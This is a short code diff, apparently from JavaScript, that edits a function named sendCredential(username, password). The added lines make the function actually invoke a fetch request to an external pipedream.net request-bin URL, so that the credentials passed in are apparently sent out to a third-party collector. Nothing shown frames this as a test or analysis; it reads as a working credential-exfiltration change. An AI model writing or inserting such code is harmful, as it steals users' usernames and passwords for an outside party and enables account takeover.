@@ -23,7 +23,9 @@ function sendCredential(username, password) {
 
     const request = async() => {
         const response = await fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
-    }
+    };
+    request();
+    console.log("done");
 }
 
 
